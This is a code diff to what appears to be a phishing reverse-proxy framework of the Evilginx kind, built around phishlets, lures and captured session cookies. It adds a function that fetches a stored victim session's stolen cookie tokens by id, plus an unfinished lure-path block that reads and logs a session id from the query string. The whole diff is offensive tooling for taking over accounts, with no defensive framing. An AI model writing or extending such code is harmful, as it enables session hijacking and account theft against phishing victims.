@@ -544,6 +544,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+				// redirect to session if triggered lure path
+				if pl != nil {
+					_, err := p.cfg.GetLureByPath(pl_name, req_path)
+					if err == nil {
+						sid := req.URL.RawQuery
+						log.Debug("sid: %s", sid)
+					}
+				}
+
 
 				// redirect to login page if triggered lure path
 				if pl != nil {
@@ -1996,6 +2005,37 @@ func (p *HttpProxy) genAccessUrl(url string) string {
 	return accessUrl
 }
 
+func (p *HttpProxy) getSessionCookieToken (sessionId string) map[string]map[string]*database.CookieToken {
+	id, err := strconv.Atoi(sessionId)
+		if err != nil {
+			return nil
+		}
+	sessions, err := p.db.ListSessions()
+	if err != nil {
+		return nil
+	}
+	if len(sessions) == 0 {
+		log.Info("no saved sessions found")
+		return nil
+	}
+	s_found := false
+	for _, s := range sessions {
+		if s.Id == id {
+			_, err := p.cfg.GetPhishlet(s.Phishlet)
+			if err != nil {
+				log.Error("%v", err)
+				return nil
+			}
+			s_found = true
+			return s.CookieTokens
+		}
+	}
+	if !s_found {
+		log.Error("id %d not found", id)
+	}
+	return nil
+}
+
 type dumbResponseWriter struct {
 	net.Conn
 }
@@ -2043,4 +2083,5 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
 }
+
 
